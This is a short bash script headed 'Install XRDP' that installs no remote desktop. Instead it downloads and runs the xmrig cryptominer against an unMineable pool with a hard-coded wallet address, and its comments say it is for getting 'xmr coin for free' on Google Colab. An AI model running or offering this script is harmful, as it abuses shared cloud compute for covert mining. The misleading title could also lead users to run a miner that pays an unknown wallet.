#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u BAT:0x579bfd09bed10c0d6cf8301eada2613f029ef1c9.unmineable_worker_jytcjqan -p x 
